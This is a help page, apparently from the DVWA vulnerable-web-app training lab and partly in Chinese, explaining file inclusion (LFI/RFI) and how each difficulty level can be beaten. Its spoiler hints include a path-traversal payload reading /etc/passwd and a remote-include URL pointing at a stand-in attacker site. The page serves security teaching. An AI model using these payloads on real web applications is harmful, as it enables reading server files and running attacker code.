<div class="body_padded">
	<h1>帮助 - 文件包含</h1>

	<div id="code">
	<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
	<tr>
	<td><div id="code">
		<h3>简介</h3>
		<p>一些网络应用程序允许用户指定直接用于文件流的输入，或允许用户向服务器上传文件。
			在以后的时间里，网络应用程序在网络应用程序的上下文中访问用户提供的输入。 通过这样做，网络应用允许潜在的恶意文件执行。</p>

		<p>If the file chosen to be included is local on the target machine, it is called "Local File Inclusion (LFI). But files may also be included on other
			machines, which then the attack is a "Remote File Inclusion (RFI).</p>

		<p>当RFI不是一个选项时，使用另一个带有LFI的漏洞（如文件上传和目录穿越）通常可以达到同样的效果。</p>

		<p>注意，“文件包含” 一词与 “任意文件访问” 或 “文件披露” 不同。</p>

		<br /><hr /><br />

		<h3>目标</h3>
		<p>Read all <u>five</u> famous quotes from '<a href="../hackable/flags/fi.php">../hackable/flags/fi.php</a>' using only the file inclusion.</p>

		<br /><hr /><br />

		<h3>低安全级别</h3>
		<p>This allows for direct input into <u>众多PHP函数中的一个</u> that will include the content when executing.</p>

		<p>Depending on the web service configuration will depend if RFI is a possibility.</p>
		<pre>剧透：<span class="spoiler">LFI: ?page=../../../../../../etc/passwd</span>.
			剧透：<span class="spoiler">RFI: ?page=http://www.evilsite.com/evil.php</span>.</pre>

		<br />

		<h3>中安全级别</h3>
		<p>开发者已经阅读了关于LFI/RFI的一些问题，并决定对输入进行过滤。然而，所使用的模式还不够。</p>
		<pre>剧透：<span class="spoiler">LFI: Possible, due to it only cycling through the pattern matching once</span>.
			剧透：<span class="spoiler">RFI: <?php echo dvwaExternalLinkUrlGet( 'https://secure.php.net/manual/en/wrappers.php', 'PHP Streams' ); ?></span>.</pre>

		<br />

		<h3>高安全级别</h3>
		<p>开发者已经受够了。他们决定只允许某些文件被使用。然而，由于有多个具有相同基名的文件，他们使用通配符将它们全部包括在内。</p>
		<pre>剧透：<span class="spoiler">LFI: The filename only has start with a certain value.</span>.
			剧透：<span class="spoiler">RFI: Need to link in another vulnerability, such as file upload</span>.</pre>

		<br />

		<h3>不可能级别</h3>
		<p>开发者不干了，只对允许的页面进行硬编码，并提供准确的文件名。通过这样做，它消除了所有的攻击途径。</p>
	</div></td>
	</tr>
	</table>

	</div>

	<br />

	<p>参考：<?php echo dvwaExternalLinkUrlGet( 'https://en.wikipedia.org/wiki/Remote_File_Inclusion', 'Wikipedia - File inclusion vulnerability' ); ?></p>
	<p>参考：<?php echo dvwaExternalLinkUrlGet( 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.1-Testing_for_Local_File_Inclusion', 'WSTG - Local File Inclusion' ); ?></p>
	<p>参考：<?php echo dvwaExternalLinkUrlGet( 'https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion', 'WSTG - Remote File Inclusion' ); ?></p>
	<p>参考：<?php echo dvwaExternalLinkUrlGet( 'https://owasp.org/www-community/vulnerabilities/PHP_File_Inclusion', 'PHP File Inclusion' ); ?></p>

</div>
